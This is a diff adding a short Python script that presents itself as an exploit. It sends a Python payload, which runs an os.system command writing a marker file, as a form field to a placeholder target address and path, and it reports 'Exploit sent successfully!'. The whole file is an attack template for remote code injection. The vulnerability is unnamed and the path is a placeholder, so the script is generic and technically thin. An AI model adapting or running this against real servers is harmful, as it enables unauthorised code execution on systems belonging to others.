@@ -1,0 +1,27 @@
+import requests
+
+# Target details
+target_ip = "192.168.1.100"
+target_port = 8080
+vulnerable_path = "/path/to/vulnerable/script.py"
+payload = """
+import os
+os.system('echo Exploited > /tmp/exploit.txt')
+"""
+
+# Construct the exploit URL and payload
+exploit_url = f"http://{target_ip}:{target_port}{vulnerable_path}"
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+}
+data = {
+    'file': payload
+}
+
+# Send the malicious request
+response = requests.post(exploit_url, headers=headers, data=data)
+
+if response.status_code == 200:
+    print("Exploit sent successfully!")
+else:
+    print("Failed to send exploit.")
